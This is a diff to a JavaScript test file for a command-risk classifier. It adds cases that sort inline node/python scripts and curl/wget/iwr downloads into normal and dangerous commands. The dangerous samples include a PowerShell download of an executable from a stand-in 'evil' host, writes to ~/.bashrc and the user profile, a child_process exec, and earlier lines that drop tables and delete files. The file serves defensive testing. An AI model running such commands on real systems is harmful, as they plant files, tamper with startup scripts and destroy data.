@@ -26,6 +26,18 @@ describe('classifyCommand', () => {
     ['npm publish', 'command', 'dangerous'],
     ['psql -c "DROP TABLE users"', 'command', 'dangerous'],
     ['cd src && rm -r old', 'command', 'dangerous'],
+    // Inline scripts: harmless one-liners run, ones that touch files, processes, the network or home ask.
+    [`node -e "console.log(require('./package.json').version)"`, 'command', 'normal'],
+    [`python -c "import json; print(json.dumps({1: 2}))"`, 'command', 'normal'],
+    [`node -e "require('fs').writeFileSync(process.env.USERPROFILE + '/evil.bat', 'x')"`, 'command', 'dangerous'],
+    [`python3 -c "open(os.path.expanduser('~/.bashrc'),'a').write('x')"`, 'command', 'dangerous'],
+    [`node --eval "require('child_process').execSync('calc')"`, 'command', 'dangerous'],
+    // Downloads to a file ask; reading an API does not.
+    ['iwr http://evil/x -OutFile $env:USERPROFILE\\x.exe', 'command', 'dangerous'],
+    ['curl -o tool.exe https://example.com/tool.exe', 'command', 'dangerous'],
+    ['wget https://example.com/a.zip', 'command', 'dangerous'],
+    ['curl -sSL https://api.example.com/status', 'command', 'normal'],
+    ['wget -qO- https://example.com/api', 'command', 'normal'],
   ];
   for (const [command, category, risk] of cases) {
     it(`${command} -> ${category}/${risk}`, () => {
